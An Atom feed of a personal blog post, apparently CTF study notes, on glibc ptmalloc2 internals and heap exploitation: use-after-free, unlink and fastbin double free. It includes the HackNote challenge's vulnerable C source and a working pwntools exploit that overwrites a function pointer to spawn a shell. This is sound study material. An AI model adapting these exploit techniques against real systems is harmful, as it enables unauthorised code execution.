<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Scardow&#39;s blog</title>
  
  
  <link href="https://scardow.github.io/atom.xml" rel="self"/>
  
  <link href="https://scardow.github.io/"/>
  <updated>2021-09-13T14:50:14.419Z</updated>
  <id>https://scardow.github.io/</id>
  
  <author>
    <name>Scarce Shadow</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Heap Exploitation（主要记录知识框架和利用技巧，更多细节不在此记录）</title>
    <link href="https://scardow.github.io/2021/08/17/Heap%20Exploitation/"/>
    <id>https://scardow.github.io/2021/08/17/Heap%20Exploitation/</id>
    <published>2021-08-16T23:54:01.000Z</published>
    <updated>2021-09-13T14:50:14.419Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要记录堆利用手法，并会随学习过程不断补充</p><span id="more"></span><h2 id="Heap-intro-brief"><a href="#Heap-intro-brief" class="headerlink" title="Heap intro brief"></a>Heap intro brief</h2><h3 id="Heap-memory-allocator"><a href="#Heap-memory-allocator" class="headerlink" title="Heap memory allocator"></a>Heap memory allocator</h3><ul><li><p>ptmalloc2  - glibc</p></li><li><p>…</p></li></ul><p>(先记录glibc，复杂的堆管理器之后学)</p><h3 id="Mechanism-of-glibc-malloc"><a href="#Mechanism-of-glibc-malloc" class="headerlink" title="Mechanism of glibc malloc"></a>Mechanism of glibc malloc</h3><h4 id="堆中数据结构"><a href="#堆中数据结构" class="headerlink" title="堆中数据结构"></a>堆中数据结构</h4><ol><li><p>malloc分配最小空间（SIZE_T*4）</p></li><li><p>chunk 结构 chunk头 + data</p></li></ol><p><img src="https://i.loli.net/2021/08/22/3r2lGx9jIoAwp4E.png" alt="chunk的结构"></p><h5 id="Chunk-分类"><a href="#Chunk-分类" class="headerlink" title="Chunk 分类"></a>Chunk 分类</h5><h6 id="allocated-chunk"><a href="#allocated-chunk" class="headerlink" title="allocated chunk"></a>allocated chunk</h6><ul><li><p>prev_size</p><ul><li>若<strong>连续记忆体</strong>上一堆块为free chunk，prev_size为前一个堆块大小</li><li>若<strong>连续记忆体</strong>上一块为allocated chunk，则为上一块的data</li></ul></li><li><p>size<br>由于size大小存在对齐，所以size后三比特始终为零，因此可以保存三个flag</p><ul><li>PREV_INUSE (bit 0): 上一块是否allocated</li><li>IS_MMAPPED(bit 1): 该chunk是否由mmap分配</li><li>NON_MAIN_ARENA(bit 2): 是否不属于main arena    </li></ul></li></ul><p>  <img src="https://i.loli.net/2021/08/22/bxX7pK4eVUrFG8A.png" alt="Allocated chunk"></p><h6 id="free-chunk-bin"><a href="#free-chunk-bin" class="headerlink" title="free chunk ( bin )"></a>free chunk ( bin )</h6><ul><li><p>prev_size</p></li><li><p>size</p><p>  同allocated chunk</p></li><li><p>fd：指向链表的下一个chunk( 含bin头 )</p></li><li><p>bk:  指向链表的前一个chunk( 含bin头 )</p></li><li><p>fd_nextsize: 指向下一个large chunk( 不含bin头 )</p></li><li><p>bk_nextsize: 指向前一个large chunk( 不含bin头 )</p></li></ul><p><img src="https://i.loli.net/2021/08/22/YPifbKr9R6TlNuA.png" alt="free chunk"></p><h6 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h6><ul><li>第一次malloc分配的heap为main arena，未分配的大堆块为top chunk</li></ul><h6 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h6><ul><li>malloc分配时unsorted bin切块后存入，unsorted bin仍存在</li></ul><h5 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h5><p>chunk free后进入bin</p><h6 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h6><ul><li><p>单向链表, 相同大小在一条链上</p></li><li><p>LIFO </p></li><li><p><strong>不会把下一块chunk P设置成0</strong></p></li><li><p>size分为0x20，0x30，0x40 … 0x80</p><ul><li>global_max_fast = 0x80</li></ul></li></ul><p><img src="https://i.loli.net/2021/08/22/nB3SrvAiUIz2QwX.png" alt="fast bin"></p><h6 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h6><ul><li><p>双向链环, 相同大小在一条链上</p></li><li><p>FIFO</p></li><li><p><strong>会把下一块chunk P设置成0</strong></p></li><li><p>size: 0x20, 0x30, 0x40 … 0x90 … 0x3f0</p><ul><li>按照size大小分为62个bin, 分别为2~63</li></ul><table><thead><tr><th align="left">下标</th><th align="left">SIZE_SZ=8（64 位）</th></tr></thead><tbody><tr><td align="left">2</td><td align="left">0x20</td></tr><tr><td align="left">3</td><td align="left">0x30</td></tr><tr><td align="left">4</td><td align="left">0x40</td></tr><tr><td align="left">5</td><td align="left">0x50</td></tr><tr><td align="left">X</td><td align="left">0xX0</td></tr><tr><td align="left">63(3F)</td><td align="left">0x3f0</td></tr></tbody></table><ul><li>其中0x20 … 0x90为unsorted bin切割后分配的</li></ul></li></ul><h6 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h6><ul><li>双向链环(sorted)</li><li>size &gt;= 1024(0x400)</li></ul><table><thead><tr><th align="left">组</th><th align="left">数量</th><th align="left">公差</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">32</td><td align="left">64B</td></tr><tr><td align="left">2</td><td align="left">16</td><td align="left">512B</td></tr><tr><td align="left">3</td><td align="left">8</td><td align="left">4096B</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">32768B</td></tr><tr><td align="left">5</td><td align="left">2</td><td align="left">262144B</td></tr><tr><td align="left">6</td><td align="left">1</td><td align="left">不限制</td></tr></tbody></table><h6 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h6><ul><li> 双向链环</li><li>free chunk大小大于0x80, glibc将chunk先放入unsorted bin</li></ul><p><img src="https://i.loli.net/2021/08/23/sE1QdxlB9IvUwmn.png" alt="bins"></p><h3 id="malloc的执行过程"><a href="#malloc的执行过程" class="headerlink" title="malloc的执行过程"></a>malloc的执行过程</h3><ul><li><p>第一次malloc：当申请内存空间 &lt;128 KB 时， kernel分配132KB 的top chunk；&gt;128KB 时，使用mmap分配内存</p></li><li><p>第二次及之后：</p><ol><li>fastbin(LIFO)</li><li>bins 按照索引从小到大查找</li><li>top chunk</li><li>向kernel索要空间</li></ol></li></ul><h3 id="free-的执行过程与chunk的合并"><a href="#free-的执行过程与chunk的合并" class="headerlink" title="free 的执行过程与chunk的合并"></a>free 的执行过程与chunk的合并</h3><ul><li><p>free chunk先看上一块是否为free chunk(P位是否为0)，若是，则于前一堆块合并，在对前一个堆块unlink</p></li><li><p>再看下一堆块：</p><ol><li><p>top chunk: 与之合并（第二步使用的是合并之后的堆块）</p></li><li><p>free：合并后一同加入unsorted bin</p><p>inuse：加入unsorted bin</p><h2 id="堆利用手法"><a href="#堆利用手法" class="headerlink" title="堆利用手法"></a>堆利用手法</h2></li></ol></li></ul><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>free(pointer)  后未将指针ptr清空, 该ptr称作dangling pointer，即为一个pointer指向一块释放的记忆体.</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ul><li><p>infomation leak</p><ul><li>free 两个fastbin size的chunk，第二个chunk fd指向第一个chunk，若存在UAF，可将chunk user date输出leak addr</li><li>malloc一块非fastbin，free是进入unsorted bin，fd 指向libc，ke输出或malloc回该堆块</li></ul></li><li><p>struct type confusion</p></li><li><p>double free</p></li></ul><h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> (*printnote)();</span><br><span class="line"><span class="keyword">char</span> *content ;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span> *<span class="title">notelist</span>[5];</span></span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_note_content</span><span class="params">(struct note *<span class="keyword">this</span>)</span></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="keyword">this</span>-&gt;content);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_note</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i ;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">int</span> size ;</span><br><span class="line"><span class="keyword">if</span>(count &gt; <span class="number">5</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">5</span> ; i ++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!notelist[i])&#123;</span><br><span class="line">notelist[i] = (struct note*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct note));</span><br><span class="line"><span class="keyword">if</span>(!notelist[i])&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">notelist[i]-&gt;printnote = print_note_content;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>,buf,<span class="number">8</span>);</span><br><span class="line">size = atoi(buf);</span><br><span class="line">notelist[i]-&gt;content = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="keyword">if</span>(!notelist[i]-&gt;content)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>,notelist[i]-&gt;content,size);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_note</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> idx ;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>,buf,<span class="number">4</span>);</span><br><span class="line">idx = atoi(buf);</span><br><span class="line"><span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= count)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(notelist[idx])&#123;</span><br><span class="line"><span class="built_in">free</span>(notelist[idx]-&gt;content);</span><br><span class="line"><span class="built_in">free</span>(notelist[idx]);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_note</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> idx ;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>,buf,<span class="number">4</span>);</span><br><span class="line">idx = atoi(buf);</span><br><span class="line"><span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= count)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(notelist[idx])&#123;</span><br><span class="line">notelist[idx]-&gt;printnote(notelist[idx]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">magic</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;       HackNote       &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot; 1. Add note          &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot; 2. Delete note       &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot; 3. Print note        &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot; 4. Exit              &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">menu();</span><br><span class="line">read(<span class="number">0</span>,buf,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">switch</span>(atoi(buf))&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">add_note();</span><br><span class="line"><span class="keyword">break</span> ;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line">del_note();</span><br><span class="line"><span class="keyword">break</span> ;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span> :</span><br><span class="line">print_note();</span><br><span class="line"><span class="keyword">break</span> ;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span> :</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span> ;</span><br><span class="line"><span class="keyword">default</span> :</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line"><span class="keyword">break</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h5><ul><li>free后未将指针清空造成UAF</li></ul><h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><p><img src="https://i.loli.net/2021/08/25/u4IEreX3qJsYUpn.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;training.pwnable.tw&quot;</span></span><br><span class="line">port = <span class="number">11010</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = remote(host,port)</span></span><br><span class="line">r = process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"><span class="comment"># system@plt + 6</span></span><br><span class="line">system = <span class="number">0x8048506</span></span><br><span class="line">addnote(<span class="number">32</span>,<span class="string">&quot;ddaa&quot;</span>)</span><br><span class="line">addnote(<span class="number">32</span>,<span class="string">&quot;ddaa&quot;</span>)</span><br><span class="line">addnote(<span class="number">32</span>,<span class="string">&quot;ddaa&quot;</span>)</span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># note = system</span></span><br><span class="line"><span class="comment"># context = &quot;;sh;&quot;</span></span><br><span class="line">addnote(<span class="number">8</span>,p32(system) + <span class="string">b&quot;;sh;&quot;</span>)</span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Heap-overflow"><a href="#Heap-overflow" class="headerlink" title="Heap overflow"></a>Heap overflow</h3><h4 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h4><h5 id="using-unlink"><a href="#using-unlink" class="headerlink" title="using unlink"></a>using unlink</h5><p>透过overflow覆盖free chunk的fd、bk，再利用unlink</p><h6 id="unlink原理"><a href="#unlink原理" class="headerlink" title="unlink原理"></a>unlink原理</h6><p>  <img src="https://i.loli.net/2021/08/25/1HAOzMqSDYh6JKX.png" alt="unlink之前"></p><p><img src="https://i.loli.net/2021/08/25/MZUL1pQh25dNivK.png" alt="unlink之后"></p><p><img src="https://i.loli.net/2021/08/25/57IQ9bYHUrou4vR.png" alt="没有保护机制的unlink使用"></p><p><img src="https://i.loli.net/2021/08/25/7TajUrpv3wDuC9M.png" alt="unlink基本形式"></p><ul><li>根据上图，知shellcode被截断，因此可以使用jmp指令跳过</li></ul><h6 id="带有保护机制的unlink"><a href="#带有保护机制的unlink" class="headerlink" title="带有保护机制的unlink"></a>带有保护机制的unlink</h6><h3 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h3><h4 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h4><h5 id="Double-free"><a href="#Double-free" class="headerlink" title="Double free"></a>Double free</h5><ul><li><p>只会检查fastbin link list是否等于将要free的chunk</p><ul><li>free(a); free(b); free(a)</li></ul><p>此时，在malloc一个与 a 相同大小的chunk，则会取出 a，这时a 既为free，又为allocated，若在a中输入数据，就会更改a的fd指针，从而构造fake chunk，malloc出fake之后，<strong>造成任意地址任意写，或写入栈中控制程序流</strong></p></li><li><p>malloc时会检测chunk size</p><ul><li><p>在fake chunk地址 + 0x8 伪造size</p></li><li><p>在附近寻找目标size</p></li><li><h2 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h2></li></ul></li></ul><h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><ol><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/introduction/">CTFwiki</a></li><li><a href="https://www.slideshare.net/AngelBoy1?utm_campaign=profiletracking&utm_medium=sssite&utm_source=ssslideview">Angleboy的PPT</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文主要记录堆利用手法，并会随学习过程不断补充&lt;/p&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://scardow.github.io/tags/PWN/"/>
    
    <category term="Heap exploition" scheme="https://scardow.github.io/tags/Heap-exploition/"/>
    
  </entry>
  
</feed>
